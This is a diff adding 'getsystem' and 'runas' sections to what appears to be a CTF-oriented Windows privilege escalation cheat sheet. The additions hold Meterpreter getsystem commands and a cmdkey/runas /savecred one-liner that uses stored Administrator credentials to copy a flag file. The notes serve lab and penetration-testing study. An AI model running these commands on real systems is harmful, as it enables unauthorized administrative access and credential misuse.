@@ -4,6 +4,8 @@
 2. [Passwords and Port Forwarding](#passwords-and-port-forwarding)
 3. [Windows Subsystem for Linux](#windows-subsystem-for-linux)
 4. [Impersonation and Potato Attacks](#impersonation-and-potato-attacks)
+5. [getsystem](#getsystem)
+6. [runas](#runas)
 
 ## Kernel Exploits
 
@@ -234,4 +236,25 @@ impersonate_token "NT AUTHORITY\SYSTEM"
 
 shell
 #we get shell as System
+```
+
+## getsystem
+
+```shell
+#in meterpreter shell
+getsystem
+#uses multiple techniques for privesc
+#can be detected by antivirus
+
+getsystem -h
+```
+
+## runas
+
+```shell
+cmdkey /list
+#there are stored creds for Administrator
+
+#we can use runas to get root flag
+C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"
 ```
